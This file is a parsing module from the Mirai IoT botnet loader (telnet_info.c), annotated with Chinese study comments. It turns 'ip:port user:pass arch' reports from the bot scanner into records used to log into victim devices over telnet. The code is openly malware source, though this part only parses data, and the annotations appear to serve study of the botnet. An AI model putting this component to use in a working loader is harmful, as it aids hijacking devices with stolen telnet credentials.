#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "headers/includes.h"
#include "headers/telnet_info.h"
//telnet_info.c  解析约定格式的telnet信息
//解析telnet信息格式并存到telnet_info结构体中，通过获取这些信息就可以和受害者设备建立telnet连接了。

//根据参数，新建telnet_info结构并初始化变量，并返回
//应该是来自于payload模块上报的可登录iot【mirai/scanner.c/report_working函数】信息
struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t addr, port_t port, struct telnet_info *info)
{
    if (user != NULL)
        strcpy(info->user, user);
    if (pass != NULL)
        strcpy(info->pass, pass);
    if (arch != NULL)
        strcpy(info->arch, arch);
    info->addr = addr;
    info->port = port;

    info->has_auth = user != NULL || pass != NULL;  //是否有登录凭证
    info->has_arch = arch != NULL;  //是否有arch信息

    return info;
}

//解析节点的telnet信息，提取相关参数
struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out) // Format: ip:port user:pass arch
{
    char *conn, *auth, *arch;
    char *addr_str, *port_str, *user = NULL, *pass = NULL;
    ipv4_t addr;
    port_t port;

    if ((conn = strtok(str, " ")) == NULL)  //ip:port
        return NULL;
    if ((auth = strtok(NULL, " ")) == NULL) //user:pass
        return NULL;
    //arch
    arch = strtok(NULL, " "); // We don't care if we don't know the arch 【不在意arch？等等看看怎么做到不care】

    if ((addr_str = strtok(conn, ":")) == NULL) //ip
        return NULL;
    if ((port_str = strtok(NULL, ":")) == NULL) //port
        return NULL;

    if (strlen(auth) == 1)
    {
        if (auth[0] == ':')
        {
            user = "";  //空密码和空用户
            pass = "";
        }
        else if (auth[0] != '?')    //未知auth，则传入?
            return NULL;
    }
    else
    {
        user = strtok(auth, ":");   //username
        pass = strtok(NULL, ":");   //password
    }

    addr = inet_addr(addr_str);     //转成网络序
    port = htons(atoi(port_str));

    return telnet_info_new(user, pass, arch, addr, port, out);  //构建telnet_info结构体并返回。通过获取这些信息就可以和受害者设备建立telnet连接了。
}
